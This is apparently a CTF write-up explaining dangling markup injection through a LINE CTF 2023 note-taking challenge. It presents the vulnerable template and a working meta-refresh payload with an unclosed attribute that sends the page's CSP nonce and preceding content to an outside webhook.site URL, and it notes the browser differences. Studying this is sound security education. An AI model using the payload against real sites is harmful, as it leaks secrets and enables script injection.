# Dangling markup injection

## Definition

> Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible. - by PortSwigger

## Example

I learned this trick in an another-secure-store-note of LINECTF 2023. It was very expressive.

```html
<div class=main>
  <h1>📕 <%- name %> secured notes 📕</h1>
  <div>
      ... 
  </div>
  <div class=main>
      Can you tell me a secret? It will securely kept in "localStorage" of this page.
      <textarea id=secret></textarea>
      <input id=submit_storage type=submit value=Store>
      <script nonce=<%= nonce %> type='application/javascript'>
        const btn = document.getElementById('submit_storage');
        btn.addEventListener('click', (e) => {
          localStorage.setItem('secret', document.getElementById('secret').value);
          const resp = document.getElementById('response');
          resp.innerText = 'Successfully stored secret';
          setTimeout(() => resp.innerText = '', 1500);
        });
      </script>
      <p id=response></p>
  </div>
  <%- include('footer.ejs') %>
</div>
```

I have to get a nonce value to satisfy Content Security Policy. The part `<%- name %>` is possible to insert html code.&#x20;

```html
<script nonce=<%= nonce %> type='application/javascript'>  
```

We can see that the nonce is set without a single or double quotation. So, If we insert html code like `<meta http-equiv="refresh" content='1; url=https://webhook.site/asdf` , we can send the contents before the first single quotation of type attribute in script tag to an attacker site.&#x20;

```html
<%- include('header.ejs') %>
<body>
  <div class=content>
    <ul>
      <li><a class=active href='/'>Home</a></li>
      <li><a href=/bot>Talk to admin</a></li>
    </ul>
    <img src=csp.gif>

    <div class=main>
      <h1>📕 <meta http-equiv="refresh" content='1; url=https://webhook.site/395eb18c-6d82-4d05-9b50-369dd6bac054 secured notes 📕</h1>
      <div>
        <form method=POST>
          Wanna change your name?
          <input class=change-name type=text name=name placeholder="🐻 Brown">
          <input type=hidden name=csrf id=_csrf>
          <input type=submit value=Submit>
          <p class=red id=error></p>
          <p class=green id=message></p>
        </form>
      </div>
    </div>

    <div class=main>
      Can you tell me a secret? It will securely kept in "localStorage" of this page.
      <textarea id=secret></textarea>
      <input id=submit_storage type=submit value=Store>
      <script nonce=<%= nonce %> type='application/javascript'>
        const btn = document.getElementById('submit_storage');
        btn.addEventListener('click', (e) => {
          localStorage.setItem('secret', document.getElementById('secret').value);
          const resp = document.getElementById('response');
          resp.innerText = 'Successfully stored secret';
          setTimeout(() => resp.innerText = '', 1500);
        });
      </script>
      <p id=response></p>
    </div>
  </div>
  <%- include('footer.ejs') %>
</body>
```

However, chrome browser blocks HTTP URLs with "<" and "\n" character. So our dangling markup will not work in chrome based browser. It works in Firefox browser.

## References

1. [https://portswigger.net/web-security/cross-site-scripting/dangling-markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup)

